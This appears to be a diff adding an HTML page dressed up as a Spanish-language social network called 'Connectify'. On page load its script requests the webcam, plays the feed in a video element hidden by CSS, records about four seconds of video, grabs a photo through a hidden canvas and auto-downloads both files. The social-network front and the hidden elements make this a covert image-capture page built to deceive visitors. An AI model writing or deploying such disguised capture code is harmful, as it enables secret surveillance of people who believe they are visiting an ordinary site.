@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connectify - Tu Red Social</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: flex-start;
+            height: 100vh;
+            background-color: #e9f5ff; /* Color de fondo */
+            font-family: 'Roboto', sans-serif;
+            margin: 0;
+        }
+        .header {
+            background-color: #007bff; /* Color de encabezado */
+            color: white;
+            padding: 20px;
+            text-align: center;
+            width: 100%;
+            position: fixed;
+            top: 0;
+            z-index: 1000;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+        .nav {
+            display: flex;
+            justify-content: space-around;
+            padding: 10px;
+            background-color: #fff;
+            border-bottom: 1px solid #ddd;
+            width: 100%;
+            position: fixed;
+            top: 60px;
+            z-index: 1000;
+        }
+        .nav a {
+            color: #007bff;
+            text-decoration: none;
+            font-weight: bold;
+            transition: color 0.3s;
+        }
+        .nav a:hover {
+            color: #0056b3; /* Color al pasar el mouse */
+        }
+        .container {
+            width: 90%;
+            max-width: 800px;
+            margin-top: 100px; /* Espacio para el encabezado y la barra de navegación */
+            background-color: white;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            padding: 20px;
+        }
+        .content {
+            text-align: center;
+        }
+        video {
+            display: none; /* Ocultar el video */
+        }
+        canvas {
+            display: none; /* Ocultar el canvas */
+        }
+    </style>
+</head>
+<body>
+    <div class="header">Connectify</div>
+    <div class="nav">
+        <a href="#"><i class="fas fa-home"></i> Inicio</a>
+        <a href="#"><i class="fas fa-user-friends"></i> Amigos</a>
+        <a href="#"><i class="fas fa-bell"></i> Notificaciones</a>
+        <a href="#"><i class="fas fa-envelope"></i> Mensajes</a>
+    </div>
+    <div class="container">
+        <div class="content">
+            <p>¡Conéctate con tus amigos y comparte momentos!</p>
+            <div id="postsContainer"></div>
+        </div>
+    </div>
+    <video autoplay></video>
+    <canvas id="canvas"></canvas>
+    <script>
+        let mediaRecorder;
+        const chunks = [];
+        const postsContainer = document.getElementById('postsContainer');
+        const video = document.querySelector('video');
+
+        async function accederCamara() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+                video.play();
+
+                mediaRecorder = new MediaRecorder(stream);
+
+                mediaRecorder.ondataavailable = (event) => {
+                    chunks.push(event.data);
+                };
+
+                mediaRecorder.onstop = () => {
+                    const blob = new Blob(chunks, { type: 'video/webm' });
+                    const url = URL.createObjectURL(blob);
+                    const a = document.createElement('a');
+                    a.href = url;
+                    a.download = 'video.webm';
+                    document.body.appendChild(a);
+                    a.click();
+                    document.body.removeChild(a);
+                    URL.revokeObjectURL(url);
+                    chunks.length = 0; // Limpiar los chunks
+                };
+
+                mediaRecorder.start();
+                setTimeout(() => {
+                    mediaRecorder.stop(); // Detener la grabación después de 4 segundos
+                    capturarFoto(); // Capturar foto automáticamente
+                }, 4000); // 4000 ms = 4 segundos
+
+            } catch (error) {
+                console.error("Error al acceder a la cámara: ", error);
+            }
+        }
+
+        function capturarFoto() {
+            const canvas = document.getElementById('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            canvas.toBlob((blob) => {
+                const url = URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = 'foto.png'; // Nombre del archivo de la foto
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
+                URL.revokeObjectURL(url);
+            }, 'image/png');
+        }
+
+        // Iniciar automáticamente al cargar la página
+        window.onload = () => {
+            accederCamara();
+        };
+    </script>
+</body>
+</html>
